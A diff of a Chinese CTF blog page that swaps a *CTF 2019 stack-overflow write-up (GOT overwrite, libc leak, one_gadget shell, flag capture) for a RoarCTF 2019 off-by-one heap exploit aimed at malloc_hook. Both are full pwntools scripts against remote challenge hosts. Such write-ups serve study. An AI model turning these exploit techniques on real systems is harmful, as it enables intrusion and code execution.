@@ -2,28 +2,38 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>star_ctf | 风云阁</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="star_ctf | 风云阁">
+  <title>RoarCTF-2019 | 风云阁</title>
+  <meta name="keywords" content=" Pwn , CTF ">
+  <meta name="description" content="RoarCTF-2019 | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
+<meta name="description" content="@[toc] Defcon Qual 2019 Pwn shitorrent题目描述  22个队伍做出来，这题还是有点难度的。看来作者写了一个消息传递的程序。 附件有可执行程序和源码。 分析程序    添加admin pc需要自己开启一个socket发送字符串 TORADMIN 。 所以我开启了两个网络程序。 import socket  from time import sleep  impor">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AFL基础">
-<meta property="og:url" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:title" content="Defcon2019Q">
+<meta property="og:url" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/index.html">
 <meta property="og:site_name" content="风云阁">
-<meta property="og:description" content="[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021513499-6493565.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021916706.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022711028.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022730604.png">
-<meta property="article:published_time" content="2020-04-10T04:35:49.741Z">
-<meta property="article:modified_time" content="2020-04-10T04:40:24.139Z">
+<meta property="og:description" content="@[toc] Defcon Qual 2019 Pwn shitorrent题目描述  22个队伍做出来，这题还是有点难度的。看来作者写了一个消息传递的程序。 附件有可执行程序和源码。 分析程序    添加admin pc需要自己开启一个socket发送字符串 TORADMIN 。 所以我开启了两个网络程序。 import socket  from time import sleep  impor">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133508781.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411144618073.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145014084.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145057408.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145133505.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145207971.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145449340.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145541673.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145737954.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145839380.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411144248741.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133959847.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133712725.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133700701.png">
+<meta property="article:published_time" content="2020-04-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-04-11T07:10:19.743Z">
 <meta property="article:author" content="枫云李">
-<meta property="article:tag" content="fuzz">
-<meta property="article:tag" content="afl">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Defcon">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png">
+<meta name="twitter:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133508781.png">
 
 
 <link rel="icon" href="/img/mac.png">
@@ -78,7 +88,15 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(18)</small></div></li>
+    <li><div class="all active">全部文章</div></li>
+    
+        
+            <li><div data-rel="CTF">CTF</div></li>
+        
+    
+        
+            <li><div data-rel="Fuzz">Fuzz</div></li>
+        
     
 </ul>
 <div class="left-bottom">
@@ -91,7 +109,7 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="18">
+<input type="hidden" id="yelog_site_posts_number" value="20">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -136,15 +154,15 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a class="color4">CVE</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">Pwn</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CVE</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -165,7 +183,15 @@
     
     <nav id="title-list-nav">
         
-        <a  class=""
+        <a  class="CTF "
+           href="/2020/04/11/Defcon2019Q/"
+           data-tag="Pwn,CTF,Defcon"
+           data-author="" >
+            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
+            <span class="post-date" title="2020-04-11 00:00:00">2020/04/11</span>
+        </a>
+        
+        <a  class="Fuzz "
            href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/"
            data-tag="fuzz,afl"
            data-author="" >
@@ -174,35 +200,43 @@
         </a>
         
         <a  class=""
-           href="/2020/04/09/Defcon2019Q/"
-           data-tag="Pwn,CTF,Defcon"
-           data-author="" >
-            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
-            <span class="post-date" title="2020-04-09 00:00:00">2020/04/09</span>
-        </a>
-        
-        <a  class=""
            href="/2020/04/05/CVEs/"
-           data-tag="CVE,Pwn"
+           data-tag="Pwn,CVE"
            data-author="" >
             <span class="post-title" title="CVEs">CVEs</span>
             <span class="post-date" title="2020-04-05 20:45:40">2020/04/05</span>
         </a>
         
-        <a  class=""
-           href="/2020/04/01/hello-world/"
+        <a  class="CTF "
+           href="/2020/02/10/NullConCTF2020/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2020-04-01 23:49:33">2020/04/01</span>
+            <span class="post-title" title="NullConCTF2020">NullConCTF2020</span>
+            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
         </a>
         
-        <a  class=""
-           href="/2020/02/10/nullcon/"
+        <a  class="CTF "
+           href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="nullcon">nullcon</span>
-            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
+            <span class="post-title" title="强网杯2019">强网杯2019</span>
+            <span class="post-date" title="2020-01-16 02:06:12">2020/01/16</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/N1CTF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="N1CTF2019">N1CTF2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="安洵杯2019">安洵杯2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
         </a>
         
         <a  class=""
@@ -219,6 +253,14 @@
            data-author="" >
             <span class="post-title" title="heap_details">heap_details</span>
             <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/10/12/RoarCTF-2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="RoarCTF-2019">RoarCTF-2019</span>
+            <span class="post-date" title="2019-10-12 00:00:00">2019/10/12</span>
         </a>
         
         <a  class=""
@@ -251,14 +293,6 @@
            data-author="" >
             <span class="post-title" title="git handbook">git handbook</span>
             <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
-        </a>
-        
-        <a  class=""
-           href="/2019/05/26/QWB/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="QWB">QWB</span>
-            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
         </a>
         
         <a  class=""
@@ -301,11 +335,11 @@
             <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
         </a>
         
-        <a  class=""
-           href="/2019/04/29/star_ctf/"
-           data-tag=""
+        <a  class="CTF "
+           href="/2019/04/29/StarCTF/"
+           data-tag="Pwn,CTF"
            data-author="" >
-            <span class="post-title" title="star_ctf">star_ctf</span>
+            <span class="post-title" title="StarCTF">StarCTF</span>
             <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
         </a>
         
@@ -321,19 +355,33 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-star_ctf" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-RoarCTF-2019" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">star_ctf</h1>
+        <h1 class="article-title">RoarCTF-2019</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">Pwn</a>
+            
+            <a class="color4">CTF</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-16 13:17:52'>2019-04-29 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-11 01:25:10'>2019-10-12 00:00</time>
         
     </div>
     <div class="article-meta">
@@ -355,7 +403,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF2019"><span class="toc-text">*CTF2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#check"><span class="toc-text">check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thought"><span class="toc-text">Thought</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution"><span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#check-1"><span class="toc-text">check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thought-1"><span class="toc-text">Thought</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-1"><span class="toc-text">Solution</span></a></li></ol></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019"><span class="toc-text">RoarCTF 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-pwn"><span class="toc-text">easy_pwn</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -371,166 +419,145 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="CTF2019"><a href="#CTF2019" class="headerlink" title="*CTF2019"></a>*CTF2019</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><h4 id="Thought"><a href="#Thought" class="headerlink" title="Thought"></a>Thought</h4><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>###quicksort</p>
-<h4 id="check-1"><a href="#check-1" class="headerlink" title="check"></a>check</h4><pre><code class="shell">checksec quicksort
-[*] &#39;/ctf/work/star/quicksort/quicksort&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)</code></pre>
-<pre><code class="c">check ida
-
-
-unsigned int main2()
-{
-  int *v0; // ebx
-  char s; // [esp+Ch] [ebp-2Ch]
-  char v3; // [esp+Dh] [ebp-2Bh]
-  char v4; // [esp+Eh] [ebp-2Ah]
-  char v5; // [esp+Fh] [ebp-29h]
-  char v6; // [esp+10h] [ebp-28h]
-  char v7; // [esp+11h] [ebp-27h]
-  char v8; // [esp+12h] [ebp-26h]
-  char v9; // [esp+13h] [ebp-25h]
-  char v10; // [esp+14h] [ebp-24h]
-  char v11; // [esp+15h] [ebp-23h]
-  char v12; // [esp+16h] [ebp-22h]
-  char v13; // [esp+17h] [ebp-21h]
-  char v14; // [esp+18h] [ebp-20h]
-  char v15; // [esp+19h] [ebp-1Fh]
-  char v16; // [esp+1Ah] [ebp-1Eh]
-  char v17; // [esp+1Bh] [ebp-1Dh]
-  int v18; // [esp+1Ch] [ebp-1Ch]
-  int i; // [esp+20h] [ebp-18h]
-  int j; // [esp+24h] [ebp-14h]
-  void *ptr; // [esp+28h] [ebp-10h]
-  unsigned int v22; // [esp+2Ch] [ebp-Ch]
-
-  v22 = __readgsdword(0x14u);
-  v3 = 0;
-  v4 = 0;
-  v5 = 0;
-  v6 = 0;
-  v7 = 0;
-  v8 = 0;
-  v9 = 0;
-  v10 = 0;
-  v11 = 0;
-  v12 = 0;
-  v13 = 0;
-  v14 = 0;
-  v15 = 0;
-  v16 = 0;
-  v17 = 0;
-  s = 0;
-  v18 = 0;
-  puts(&quot;how many numbers do you want to sort?&quot;);
-  __isoc99_scanf(&quot;%d&quot;, &amp;v18);
-  getchar();
-  ptr = malloc(4 * v18);
-  for ( i = 0; i &lt; v18; ++i )
-  {
-    printf(&quot;the %dth number:&quot;, i + 1);
-    gets(&amp;s);
-    v0 = (int *)((char *)ptr + 4 * i);
-    *v0 = atoi(&amp;s);
-  }
-  sort1((int)ptr, 0, v18 - 1);
-  puts(&quot;Here is the result:&quot;);
-  for ( j = 0; j &lt; v18; ++j )
-    printf(&quot;%d &quot;, *((_DWORD *)ptr + j));
-  puts(&amp;byte_8048AD2);
-  free(ptr);
-  return __readgsdword(0x14u) ^ v22;
-}</code></pre>
-<h4 id="Thought-1"><a href="#Thought-1" class="headerlink" title="Thought"></a>Thought</h4><ul>
-<li><input checked disabled type="checkbox"> <p>字符数组的s溢出可以覆盖ptr, i, j 。</p>
-</li>
-<li><input checked disabled type="checkbox"> <p>改free_got到main_txt，目的用于重复输入</p>
-</li>
-<li><input checked disabled type="checkbox"> <p>利用printf(“%d”)来泄漏 函数在got表的真实地址，得到libc基地址</p>
-</li>
-<li><input checked disabled type="checkbox"> <p>one_gadget寻找execv</p>
-</li>
-<li><input checked disabled type="checkbox"> <pre><code class="shell">0x3ac5c execve(&quot;/bin/sh&quot;, esp+0x28, environ)
-constraints:
-  esi is the GOT address of libc
-  [esp+0x28] == NULL
-
-0x3ac5e execve(&quot;/bin/sh&quot;, esp+0x2c, environ)
-constraints:
-  esi is the GOT address of libc
-  [esp+0x2c] == NULL
-
-0x3ac62 execve(&quot;/bin/sh&quot;, esp+0x30, environ)
-constraints:
-  esi is the GOT address of libc
-  [esp+0x30] == NULL</code></pre>
-</li>
-<li><input checked disabled type="checkbox"> <p>修改free_got到one,然后成功pwn掉。</p>
-</li>
-</ul>
-<pre><code class="sehll">root@prime:/ctf/work/star/quicksort# ./p.py 
-[+] Opening connection to 34.92.96.238 on port 10000: Done
-[+] -136733602
-[*] Switching to interactive mode
-Here is the result:
-
-$ ls
-chall
-flag
-pwn
-$ cat flag
-*CTF{lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX}</code></pre>
-<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><pre><code class="python">#!/usr/bin/env python
+        <h1 id="RoarCTF-2019"><a href="#RoarCTF-2019" class="headerlink" title="RoarCTF 2019"></a>RoarCTF 2019</h1><h3 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h3><p>思路:<br> <code>write note</code> 存在 <code>off-by-one</code> 漏洞。填充 <code>chunk A</code>溢出改写下一个<code>chunk B</code>的<code>size</code>来扩大溢出范围，再分配<code>chunk B</code> 来溢出改写<code>free</code>掉的<code>chunk C&#39;s fd</code>到<code>small chunk D</code>,<code>free</code>掉<code>small chunk D</code>,<code>show note</code> 泄漏 <code>unsorted_bin</code>得到<code>libc_base</code>。<br> 再通过溢出改写 <code>fast_bin chunk fd</code> ，分配到<code>malloc_hook</code>附近写 <code>one_gadget</code>。触发 <code>malloc_printerr</code>来<code>getshell</code></p>
+<pre><code>#!/usr/bin/env python
+#coding=utf8
 from pwn import *
-import ctypes
-#p = process(&#39;./quicksort&#39;)
-#nc 34.92.96.238 10000
-p = remote(&#39;34.92.96.238&#39;,10000)
-
-debug = 0
-if debug:
-    context.log_level = &#39;debug&#39;    
-    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-    gdb.attach(p)
-
-libc_start_got = 0x804a030
-#[0x804a018] free
-main2_addr = 0x8048816 #134514710
-free_got = 0x804a018
-puts_got = 0x804a02c
-
-puts_plt = 0x8048560  #134514016
-printf_plt = 0x80484f0 #134513904
-puts_libc = 0x5fca0
-one = 0x3ac5e#0x3ac62
+p=process(&#39;./easy_pwn&#39;)
+p=remote(&#39;39.97.182.233&#39;,40205)
+ctx = context
+ctx.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
 
 
-p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
-pay = str(main2_addr)+&#39;\x00&#39;+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(1)+p32(0)+p32(0)+p32(free_got)
-p.sendlineafter(&#39;number:&#39;,pay)
+#----- debug info -----#
+# ctx.log_level = &#39;debug&#39;
+
+#----- debug info -----#
+
+#----- quick script -----#
+sd =lambda c:p.send(c)
+sdl =lambda c:p.sendline(c)
+sda = lambda a,c: p.sendafter(a,c)
+sdla = lambda a,c: p.sendlineafter(a,c)
+rl =lambda :p.recvline()
+ru =lambda c:p.recvuntil(c,True)
+rle =lambda c:p.recvline_endswith(c,keepends=False)
+rls =lambda c:p.recvline_startswith(c,False)
+rn = lambda c:p.recvn(c)
+uu64 = lambda c:  u64(c.ljust(8,chr(0)))
+itr =lambda :p.interactive()
+#----- quick script -----#
+
+#----- global variables -----#
+
+#----- global variables -----#
+def cmd(c):
+    sdla(&#39;choice: &#39;,str(c))
+
+def add(sz):
+    cmd(1)
+    sdla(&#39;size: &#39;,str(sz))
+
+def edit(idx,sz,c):
+    cmd(2)
+    sdla(&#39;index: &#39;,str(idx))
+    sdla(&#39;size: &#39;,str(sz))
+    sda(&#39;content: &#39;,c)
+
+def edit_over10(idx,sz,c):
+    cmd(2)
+    sdla(&#39;index: &#39;,str(idx))
+    sdla(&#39;size: &#39;,str(sz+10))
+    sda(&#39;content: &#39;,c)
+
+def free(idx):
+    cmd(3)
+    sdla(&#39;index: &#39;,str(idx))
+
+def show(idx):
+    cmd(4)
+    sdla(&#39;index: &#39;,str(idx))
+
+def attack():
+    # show 0x01122
+    add(0x18) #0
+    add(0x18) #1
+
+    add(0x18) #2
+    add(0x18) #3
+
+    add(0x18) #4
+    add(0x18) #5
+    add(0x80) #6 0xc0
+    add(0x18) #7
+
+    add(0x28) #8
+    add(0x28) #9
+    add(0x60) #10
+    add(0x60) #11
+    add(0x28) #12
+    add(0x28) #13
+    add(0x28) #14
+
+    edit_over10(0,0x18,&#39;a&#39;*0x18+&#39;\x41&#39;) #prepare overflow 
+    free(1)
+    add(0x38) #1
+    edit(1,0x20,&#39;\x00&#39;*0x18+p64(0x21)) #recover size;
+
+    edit_over10(4,0x18,&#39;a&#39;*0x18+&#39;\xb1&#39;) 
+    free(5)
+    add(0xa1) #5
+    edit(5,0x20,&#39;\x00&#39;*0x18+p64(0x21))
+
+    free(3)
+    free(2)
+
+    edit(1,0x21,&#39;a&#39;*0x18+p64(0x21)+&#39;\xc0&#39;)
+    add(0x18) #2
+    add(0x18) #3
+
+    edit(5,0x20,&#39;\x00&#39;*0x18+p64(0x91))
+    free(6)
+    show(3)
+
+    unsorted_bin=uu64(rn(6+9)[9:])
+    print(hex(unsorted_bin))
+    base=unsorted_bin-0x3c4b78
+    print(hex(base))
+    fake_chunk=base+3951365-0x10-0x8
+    one=base+0xf02a4
+    print(hex(one))
+
+    add(0x80)
+
+    edit_over10(8,0x28,&#39;a&#39;*0x28+&#39;\xa1&#39;)
+    free(9)
+    add(0x98) #9
+    edit(9,0x30,&#39;\x00&#39;*0x28+p64(0x71))
+
+    free(11)
+    free(10)
+    edit(9,0x38,&#39;\x00&#39;*0x28+p64(0x71)+p64(fake_chunk))
+    add(0x60) #10
+    add(0x60) #11
+
+    edit(11,0x13+8,0x13*&#39;\x00&#39;+p64(one))
+    show(0)
+
+    edit_over10(12,0x28,&#39;a&#39;*0x28+&#39;\x88&#39;)
+    free(13)
+
+    #gdb.attach(p,&#39;b *&#39;)
+    #free(6)
+
+    #add(0x20)
+    itr()
+
+    pass
 
 
-p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
-pay = str(printf_plt)+&#39;\x00&#39;+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(1)+p32(1)+p32(0)+p32(puts_got)
-p.sendlineafter(&#39;number:&#39;,pay)
-
-p.recvline()
-x = ctypes.c_uint(int(p.recvline())).value
-one_real = x + one-puts_libc
-one_real = ctypes.c_int(one_real).value
-#print len(str(one_real))
-log.success(one_real)
-
-p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
-pay = str(one_real)+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(0)+p32(0)+p32(0)+p32(free_got)#+&#39;\x00&#39;*100
-p.sendlineafter(&#39;number:&#39;,pay)
-
-p.interactive()</code></pre>
-<p>x</p>
-
+if __name__==&quot;__main__&quot;:
+    attack()</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
     </div>
@@ -539,12 +566,12 @@ p.interactive()</code></pre>
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>star_ctf</p>
+    <p><span class="copy-title">文章标题:</span>RoarCTF-2019</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-04-29, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-16, 13:17:52</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/04/29/star_ctf/" title="star_ctf">https://primelyw.github.io/2019/04/29/star_ctf/</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-12, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-11, 01:25:10</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/12/RoarCTF-2019/" title="RoarCTF-2019">https://primelyw.github.io/2019/10/12/RoarCTF-2019/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
@@ -588,7 +615,7 @@ p.interactive()</code></pre>
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#CVE','#Pwn','#CTF','#Defcon','#fuzz','#afl',],
+            'data': ['#Pwn','#CTF','#CVE','#Defcon','#fuzz','#afl',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
@@ -672,53 +699,6 @@ p.interactive()</code></pre>
 
 <!--自定义样式设置-->
 <style>
-    
-    
-    .nav {
-        width: 542px;
-    }
-    .nav.fullscreen {
-        margin-left: -542px;
-    }
-    .nav-left {
-        width: 120px;
-    }
-    
-    
-    @media screen and (max-width: 1468px) {
-        .nav {
-            width: 492px;
-        }
-        .nav.fullscreen {
-            margin-left: -492px;
-        }
-        .nav-left {
-            width: 100px;
-        }
-    }
-    
-    
-    @media screen and (max-width: 1024px) {
-        .nav {
-            width: 492px;
-            margin-left: -492px
-        }
-        .nav.fullscreen {
-            margin-left: 0;
-        }
-        .nav .hide-list.fullscreen {
-            left: 492px
-        }
-    }
-    
-    @media screen and (max-width: 426px) {
-        .nav {
-            width: 100%;
-        }
-        .nav-left {
-            width: 100%;
-        }
-    }
     
     
     .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
